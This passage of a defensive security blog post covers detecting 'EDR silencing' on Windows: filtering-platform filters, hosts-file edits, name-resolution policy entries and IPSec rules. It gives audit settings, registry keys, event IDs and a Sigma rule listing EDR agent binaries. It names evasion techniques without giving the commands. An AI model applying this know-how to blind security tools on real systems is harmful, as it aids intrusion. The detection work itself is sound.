![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-policy-change.png?w=1024)_Audit Filtering Platform Policy Change_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-filtering-platform.png?w=1024)_Audit Filtering Platform Connection & Packet Drop_

It needs to be highlighted that enabling these policies will cause a significant increase in windows event logs. If data storage is not a concern, detection engineering efforts should focus on processes attempting to add filters (5444 & 5147).

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-logs.png?w=1024)_Windows Filtering Platform – Multiple Events_

#### Registry

Windows Filtering Platform filters are stored in the registry. SOC teams should investigate the GUID values to identify rules associated with the EDR process during incident response. Monitoring the key that stores the filter is recommended to identify new additions.

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BFE\Parameters\Policy\Persistent\Filter
```

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-filters-registry-key.png?w=1024)_EDR Silencing – Registry Key_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-filters-registry-key.png?w=1024)_Audit Filters Registry Key_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-edrnoisemaker.png?w=933)_EDR Silencer & EDR Noise Maker_

Filters that have been added in the Windows Filtering Platform, could be viewed by the [Windows Filtering Platform Explorer](https://github.com/zodiacon/WFPExplorer) tool.

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-windows-filtering-platform-explorer.png?w=1024)_Windows Filtering Platform Explorer_

### Hosts File

An alternative method to restrict EDR outbound communication is via modification of the _hosts_ file. Identification of any changes in the _etc\\hosts_ file requires enabling auditing for _File System_ and _Handle Manipulation_.

```
Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Object Access > Audit File System
Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Object Access > Audit Handle Manipulation
```

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-file-system-handle-manipulation.png?w=1024)_Audit File System & Handle Manipulation_

The path of the _hosts_ file should be also added under the _File System_ container.

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-hosts-file.png?w=1024)_Audit Hosts File_

It is recommended to apply auditing for Read/Write and Modify permissions.

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-hosts-file-permissions.png?w=1024)_Audit Hosts File Permissions_

Any changes to the _hosts_ file will be captured under Windows Event ID 4663.

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-hosts-file-event-id.png?w=1024)_Hosts File Event ID_

### Name Resolution Policy Table

The Name Resolution Policy Table could also be abused by threat actors to bind EDR domains to non-legitimate hosts. Records to the Name Resolution Policy Table could be added via a PowerShell cmdlet. Endpoint Detection and Response technologies can capture command line arguments so detection should be trivial. It should be noted that the entries to the Name Resolution Policy Table are stored in the following registry key:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\DnsPolicyConfig
```

Therefore, it is recommended to apply monitoring for this key and subkeys via Group Policy.

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-name-resolution-policy-table.png?w=1024)_Audit Name Resolution Policy Table_

Even though the _Add-DnsClientNrptRule_ is not a WMI cmdlet, it interacts internally with WMI to query DNS client configuration and to check the state of the Name Resolution Policy Table. This will cause changes to the NRPT to appear from the process _WmiPrvSE_.exe. Modifications to the Name Resolution Policy Table will generate the following events:

| Action | Event ID |
| --- | --- |
| Handle Request | 4656 |
| Access Object | 4663 |
| Registry Key Modification | 4657 |

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4656.png?w=1024)_Name Resolution Policy Table – Event ID 4656_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4663.png?w=1024)_Name Resolution Policy Table – Event ID 4663_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-name-resolution-policy-table-event-id-4657.png?w=1024)_Name Resolution Policy Table – Event ID 4657_

### IPSec Filter Rules

Adding IPSec Filter Rules to block EDR traffic can be performed from the command line by executing the _netsh_ utility. IPSec policy configurations are stored in registry, therefore monitoring the associated key is required to detect arbitrary IPSec filters. SOC teams should enable monitoring for registry changes of the IPSec Policy registry key and subkeys.

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-audit-ipsec-filter-rules.png?w=1024)_Audit IPSec Filter Rules_

Threat actors that could leverage IPSec filters to restrict EDR outbound traffic will generate a sequence of windows events. Attempts to access and modify the IPSec registry key from the _netsh_ process should be considered arbitrary. Furthermore, the creation of new IPSec policies could be captured under Windows Event ID 5460 and 5471. It is recommended to correlate these actions with the registry key events that target IPSec policies. The table below associates the actions of this procedure with the windows event ID’s.

| Action | Event ID |
| --- | --- |
| Handle Request | 4656 |
| Object Access | 4663 |
| Registry Value Modification | 4657 |
| IPSec Policy Agent Applied | 5460 |
| IPSec Policy Agent Loaded | 5471 |

![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-agent-loaded.png?w=1024)_IPSec Policy Agent Loaded_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-policy-agent.png?w=1024)_IPSec Policy Agent Event ID_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-request-handle.png?w=1024)_IPSec – Request Handle_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-access-object.png?w=1024)_IPSec – Access Object_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-registry-key-modification.png?w=1024)_IPSec – Registry Key Modification_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-process-access-registry-key.png?w=1024)_IPSec – Process Access Registry Key_![](https://ipurple.team/wp-content/uploads/2026/01/edr-silencing-ipsec-filters-registry-key.png?w=1024)_IPSec Registry Key Modification_

### SIGMA

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36 | `title:``WFP Blocked Outbound Connection From Common EDR Agent Binary`<br>`id:``6b2b5db7-8f7e-4b6e-b9d4-29f0a9edc0d1`<br>`status:``Production`<br>`description:``Detects Windows Filtering Platform blocked connection events (5157) for common EDR/AV agent processes``,``which may indicate EDR silencing via WFP filters.`<br>`references:`<br>```-``https``:``//github.com/netero1010/EDRSilencer`<br>`author:``Panos Gkatziroulis`<br>`date:``2026-01-06`<br>`tags:`<br>```-``attack.defense-evasion`<br>```-``attack.t1562`<br>`logsource:`<br>```product:``windows`<br>```service:``security`<br>`detection:`<br>```selection:`<br>```EventID:``5157`<br>```Direction|contains``:``'Outbound'`<br>```Application|endswith``:`<br>```-``'\MsSense.exe'`<br>```-``'\SenseIR.exe'`<br>```-``'\SenseCncProxy.exe'`<br>```-``'\SenseNdr.exe'`<br>```-``'\MsMpEng.exe'`<br>```-``'\NisSrv.exe'`<br>```-``'\CSFalconService.exe'`<br>```-``'\CylanceSvc.exe'`<br>```-``'\elastic-agent.exe'`<br>```-``'\elastic-endpoint.exe'`<br>```-``'\SentinelAgent.exe'`<br>```-``'\TaniumClient.exe'`<br>```condition:``selection`<br>`falsepositives:`<br>```-``Legitimate firewall policy blocks or troubleshooting`<br>```-``Temporary EDR backend outages coupled with local policy changes`<br>`level:``high` |

EDR Silencing is a technique that enables threat actors with elevated privileges on the asset to restrict endpoint detection and response visibility in order to execute less opsec oriented techniques. Changes to the _hosts_ file, to the name resolution policy table or creation of Windows Filtering Platform rules should be considered critical for any organization. SOC teams should ensure that all the associated registry keys are monitored, and detection rules are developed and deployed. From the perspective of establishing resilience against this threat, the related procedures could be detected with high confidence if organizations are prepared to enable the required visibility.

### Share this:

- [Share on X (Opens in new window)X](https://ipurple.team/2026/01/12/edr-silencing/?share=x&nb=1)
- [Email a link to a friend (Opens in new window)Email](mailto:?subject=%5BShared%20Post%5D%20EDR%20Silencing&body=https%3A%2F%2Fipurple.team%2F2026%2F01%2F12%2Fedr-silencing%2F&share=email&nb=1)
- [Share on LinkedIn (Opens in new window)LinkedIn](https://ipurple.team/2026/01/12/edr-silencing/?share=linkedin&nb=1)
- [Share on Facebook (Opens in new window)Facebook](https://ipurple.team/2026/01/12/edr-silencing/?share=facebook&nb=1)
- [Share on Reddit (Opens in new window)Reddit](https://ipurple.team/2026/01/12/edr-silencing/?share=reddit&nb=1)
- [Share on Mastodon (Opens in new window)Mastodon](https://ipurple.team/2026/01/12/edr-silencing/?share=mastodon&nb=1)
- [More](https://ipurple.team/2026/01/12/edr-silencing/#)

- [Share on X (Opens in new window)X](https://ipurple.team/2026/01/12/edr-silencing/?share=twitter&nb=1)

LikeLoading…

## One response to “EDR Silencing”

1. ![Koifsec Avatar](https://0.gravatar.com/avatar/99173d9dea255831962113da6f27f461f9c47e028545a01ea0ca6898635ec328?s=40&d=identicon&r=G)









Koifsec



January 12, 2026







A highly enjoyable read, super in-depth with a lot to take home. Thanks!



[Like](https://ipurple.team/2026/01/12/edr-silencing/?like_comment=46&_wpnonce=f5c5c4ba03) Like





[Reply](https://ipurple.team/2026/01/12/edr-silencing/comment-page-1/?replytocom=46#respond)


### Leave a comment [Cancel reply](https://ipurple.team/2026/01/12/edr-silencing/\#respond)

Δ

Previous Post

[Bind Link – EDR Tampering](https://ipurple.team/2025/12/01/bind-link-edr-tampering/)

[AppLocker Rules Abuse](https://ipurple.team/2026/02/02/applocker-rules-abuse/) →

[Toggle photo metadata visibility](https://ipurple.team/2026/01/12/edr-silencing/#)[Toggle photo comments visibility](https://ipurple.team/2026/01/12/edr-silencing/#)

Loading Comments...

Write a Comment...

Email (Required)Name (Required)Website

- [Comment](https://ipurple.team/2026/01/12/edr-silencing/#comments)
- [Reblog](https://ipurple.team/2026/01/12/edr-silencing/)
- [Subscribe](https://ipurple.team/2026/01/12/edr-silencing/) [Subscribed](https://ipurple.team/2026/01/12/edr-silencing/)








  - [![](https://ipurple.team/wp-content/uploads/2023/11/purple-unicorn-hacking-a-computer-1-2.jpg?w=50) Purple Team](https://ipurple.team/)

Join 111 other subscribers

Sign me up

  - Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fipurple.team%252F2026%252F01%252F12%252Fedr-silencing%252F)


- - [![](https://ipurple.team/wp-content/uploads/2023/11/purple-unicorn-hacking-a-computer-1-2.jpg?w=50) Purple Team](https://ipurple.team/)
  - [Subscribe](https://ipurple.team/2026/01/12/edr-silencing/) [Subscribed](https://ipurple.team/2026/01/12/edr-silencing/)
  - [Sign up](https://wordpress.com/start/)
  - [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fipurple.team%252F2026%252F01%252F12%252Fedr-silencing%252F)
  - [Copy shortlink](https://wp.me/pffK4K-pW)
  - [Report this content](https://wordpress.com/abuse/?report_url=https://ipurple.team/2026/01/12/edr-silencing/)
  - [View post in Reader](https://wordpress.com/reader/blogs/225397078/posts/1608)
  - [Manage subscriptions](https://subscribe.wordpress.com/)
  - [Collapse this bar](https://ipurple.team/2026/01/12/edr-silencing/)

%d